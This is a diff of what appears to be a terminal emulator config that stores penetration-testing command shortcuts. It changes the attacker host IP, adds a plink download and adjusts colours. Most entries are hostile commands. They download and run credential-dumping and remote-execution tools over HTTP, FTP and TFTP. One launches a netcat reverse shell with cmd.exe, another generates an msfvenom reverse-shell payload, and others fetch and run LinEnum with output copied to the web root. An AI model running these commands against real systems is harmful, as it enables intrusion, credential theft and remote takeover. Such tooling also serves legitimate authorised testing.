@@ -51,87 +51,92 @@
       name = "Linux/find txt,zip,bak,rar,tar,md files"
       position = 31
     [[[Upload/Powershell - accesschk]]]
-      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.222/accesschk.exe','accesschk.exe'); }"'''
+      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.30.31/accesschk.exe','accesschk.exe'); }"'''
       enabled = True
       name = Upload/Powershell - accesschk
       position = 14
     [[[Upload/Powershell - fgdump]]]
-      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.222/fgdump.exe','fgdump.exe'); }"'''
+      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.30.31/fgdump.exe','fgdump.exe'); }"'''
       enabled = True
       name = Upload/Powershell - fgdump
       position = 15
     [[[Upload/Powershell - nc.exe]]]
-      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.222/nc.exe','nc.exe'); }"'''
+      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.30.31/nc.exe','nc.exe'); }"'''
       enabled = True
       name = Upload/Powershell - nc.exe
       position = 17
+    [[[Upload/Powershell - plink]]]
+      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.30.31/plink.exe','plink.exe'); }"'''
+      enabled = True
+      name = Upload/Powershell - plink
+      position = 50
     [[[Upload/Powershell - psexec]]]
-      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.222/PsExec.exe','PsExec.exe'); }"'''
+      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.30.31/PsExec.exe','PsExec.exe'); }"'''
       enabled = True
       name = Upload/Powershell - psexec
       position = 16
     [[[Upload/Powershell - wget]]]
-      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.222/wget.exe','wget.exe'); }"'''
+      command = '''powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.30.31/wget.exe','wget.exe'); }"'''
       enabled = True
       name = Upload/Powershell - wget
       position = 39
     [[[Upload/Windows Cscript - netcat]]]
-      command = cscript wget.vbs http://192.168.2.222/netcat/nc.exe nc.exe
+      command = cscript wget.vbs http://192.168.30.31/netcat/nc.exe nc.exe
       enabled = True
       name = Upload/Windows Cscript - netcat
       position = 13
     [[[Upload/Windows ftp - accesschk]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get accesschk.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get accesschk.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & accesschk.exe /accepteula -uwcqv "Authenticated Users" *
       enabled = True
       name = Upload/Windows ftp - accesschk
       position = 25
     [[[Upload/Windows ftp - fgdump]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get fgdump.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & fgdump.exe
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get fgdump.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & fgdump.exe
       enabled = True
       name = Upload/Windows ftp - fgdump
       position = 19
     [[[Upload/Windows ftp - nc.exe]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 192.168.2.222 443 -e cmd.exe
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 192.168.30.31 443 -e cmd.exe
       enabled = True
       name = Upload/Windows ftp - nc.exe
       position = 21
     [[[Upload/Windows ftp - privesccheck]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get privesc-check.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & privesc-check.exe -r -t -S -P
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get privesc-check.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & privesc-check.exe -r -t -S -P
       enabled = True
       name = Upload/Windows ftp - privesccheck
       position = 27
     [[[Upload/Windows ftp - procexp]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get procexp.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get procexp.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
       enabled = True
       name = Upload/Windows ftp - procexp
       position = 23
     [[[Upload/Windows ftp - psexec]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get PsExec.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get PsExec.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
       enabled = True
       name = Upload/Windows ftp - psexec
       position = 22
     [[[Upload/Windows ftp - tcpview]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get Tcpview.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get Tcpview.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
       enabled = True
       name = Upload/Windows ftp - tcpview
       position = 20
     [[[Upload/Windows ftp - wget.exe]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get wget.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get wget.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
       enabled = True
       name = Upload/Windows ftp - wget.exe
       position = 24
     [[[Upload/Windows ftp - wget.vbs]]]
-      command = (echo open 192.168.2.222&echo anonymous&echo whatever&echo binary&echo get wget.vbs&echo bye) > ftp.txt & ftp -s:ftp.txt
+      command = (echo open 192.168.30.31&echo anonymous&echo whatever&echo binary&echo get wget.vbs&echo bye) > ftp.txt & ftp -s:ftp.txt
       enabled = True
       name = Upload/Windows ftp - wget.vbs
       position = 26
     [[[Upload/Windows tftp - wget.vbs]]]
-      command = tftp -i 192.168.2.222 get wget.vbs .
+      command = tftp -i 192.168.30.31 get wget.vbs .
       enabled = True
       name = Upload/Windows tftp - wget.vbs
       position = 18
     [[[Upload/wget - sid-shell]]]
-      command = cd /tmp; wget http://192.168.2.222/sid-shell; chmod 775 sid-shell
+      command = cd /tmp; wget http://192.168.30.31/sid-shell; chmod 775 sid-shell
       enabled = True
       name = Upload/wget - sid-shell
       position = 28
@@ -141,7 +146,7 @@
       name = Windows/AlwaysInstallElevated
       position = 44
     [[[Windows/Generate reverse shell payload]]]
-      command = msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.222 LPORT=443 -f python -b \x00\x0a\x0d
+      command = msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.31 LPORT=443 -f python -b \x00\x0a\x0d
       enabled = True
       name = Windows/Generate reverse shell payload
       position = 35
@@ -166,7 +171,7 @@
       name = Windows/create user spotless; add to admins and RDP groups;
       position = 12
     [[[curl launch LinEnum.sh. Results in www]]]
-      command = cd /tmp; curl -O http://192.168.2.222/privesc/LinEnum.sh; chmod 775 *.sh; ./LinEnum.sh | tee enum.log; cp enum.log /var/www/html/
+      command = cd /tmp; curl -O http://192.168.30.31/privesc/LinEnum.sh; chmod 775 *.sh; ./LinEnum.sh | tee enum.log; cp enum.log /var/www/html/
       enabled = True
       name = curl launch LinEnum.sh. Results in www
       position = 7
@@ -266,7 +271,7 @@
       name = wfuzz - directory traversal
       position = 45
     [[[wget launch LinEnum.sh. Results in www]]]
-      command = cd /tmp; wget http://192.168.2.222/privesc/LinEnum.sh; chmod 775 *.sh; ./LinEnum.sh | tee enum.log ; cp enum.log /var/www/html/
+      command = cd /tmp; wget http://192.168.30.31/privesc/LinEnum.sh; chmod 775 *.sh; ./LinEnum.sh | tee enum.log ; cp enum.log /var/www/html/
       enabled = True
       name = wget launch LinEnum.sh. Results in www
       position = 8
@@ -278,8 +283,8 @@
     cursor_color = "#aaaaaa"
     font = Courier New 10
     foreground_color = "#17868d"
-    scrollback_lines = 1000
+    scrollback_lines = 3000
   [[default2]]
-    background_color = "#074e57"
+    background_color = "#0a3d44"
     cursor_color = "#aaaaaa"
     foreground_color = "#97b4b8"
